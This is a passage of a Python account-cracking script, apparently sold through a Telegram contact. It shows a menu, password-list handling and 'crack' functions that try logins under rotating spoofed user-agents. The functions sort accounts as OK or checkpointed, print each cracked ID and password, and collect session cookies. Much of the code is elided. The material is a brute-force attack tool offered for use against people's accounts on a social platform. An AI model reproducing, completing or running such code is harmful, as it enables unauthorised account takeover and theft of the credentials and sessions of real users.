...
logo =f"""  \x1b[1;92m
   ...
   / /\ \ |  _  /  | |   \   // /\ \ | . ` | 
  / ____ \| | \ \ _| |_   | |/ ____ \| |\  | 
 /_/    \_\_|  \_\_____|  |_/_/    \_\_| \_| \x1b[1;92m
\033[1;35m------------------------------------------------
\033[1;38m Author : ARIYAN
\033[1;34m Price     :  Inbox 
\033[1;31m Telegram : @ariyan_ahmed83
\033[1;39m Github : NOT
\033[1;32m------------------------------------------------
 """
 #------------------[  ]-------------------#
...
def menu():
    ...
    print('------------------------------------------------')
    HAMA = input('\033[1;37m[\033[1;31m!\033[1;37m] Choose: ')
    if HAMA in ['11']:
        rcrack()
        dump_massal()
    elif HAMA in ['1']:
...
def setting():
    ...
    hu = input('\033[1;37m[\033[1;34m!\033[1;37m] Choose: ')
    if hu in ['1','01']:
    ...
    hc = input('\033[1;37m[\033[1;33m!\033[1;37m] Choose:  ')
    if hc in ['1','01']:
...
def passwrd():
    ...
    print(logo)  
    print('\033[1;37m-----------------------------------------------')
    print('Total Id :\033[1;32m ' +str(len(id)))
 ...
 #   print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('CRACK ARIYAN BU  OK '%(ok))
    print('CRACK ARIYAN BU CP '%(cp))
    print('\n\033[1;37m===================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \033[1;34m[7ANTAR]  {P}{b}\033[1;37m{loop}|{P}  OK:{P}{H}\033[1;37m{ok}{P}   CP:{P}{M}\033[1;37m{cp}{P}  {'{:.0%}'.format(loop/float(len(id)))}  "),
    sys.stdout.flush()
...
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/15.6.1 Mobile/12B436 Safari/614.3.7'])
    ...
    'user-agent': ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[32 \033[1;31m[7ANTAR-CP]\033[1;32m {idf} | {pw}')
                ...
                print(f'\r\x1b[32 \033[1;32m[7ANTAR-OK]\033[1;32m {idf} | {pw}')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}\x1b[33m[\x1b[32m7ANTAR\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m]{P} \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK/\x1b[36mCP\x1b[33m] \x1b[33m[\x1b[32m{ok}/\x1b[36m{cp}\x1b[33m] \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]  "),
    sys.stdout.flush()
    ua = random.choice(ugen2)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'user-agent': ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                print(f'\r\033[0;93m[\33[1;96m7ANTAR-CP\33[1;93m]  {idf}  {pw} ')
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                print(f'\r\33[1;93m[\33[1;92m7ANTAR-OK\33[1;93m] \33[1;92m{idf} {pw} ')
